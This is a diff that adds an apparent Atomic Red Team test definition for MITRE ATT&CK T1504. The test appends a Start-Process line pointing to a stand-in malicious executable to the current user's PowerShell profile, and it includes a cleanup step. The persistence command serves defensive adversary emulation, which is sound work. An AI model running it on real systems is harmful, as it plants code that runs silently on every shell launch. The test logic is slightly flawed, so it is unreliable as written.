@@ -1,0 +1,35 @@
+---
+attack_technique: T1504
+display_name: PowerShell Profile
+
+atomic_tests:
+- name: Append malicious start-process cmdlet 
+  description: |
+    Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable
+  supported_platforms:
+    - windows
+   
+  input_arguments:
+    exe_path:
+      description: Path the malicious executable
+      type: Path
+      default: C:\tmp\malicious.exe
+
+    ps_profile:
+      description: Powershell profile to use
+      type: Path
+      default: $profile
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: | # these are the actaul attack commands, at least one command must be provided
+      if(Test-Path #{ps_profile} -ne True){
+        New-Item -Path #{ps_profile} -Type File –Force
+      }else{
+        $oldprofile = cat #{ps_profile}
+      }
+      $malicious = "Start-Process #{exe_path}"
+      Add-Content #{ps_profile} -Value $malicious
+    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      Set-Content #{ps_profile} -Value $oldprofile
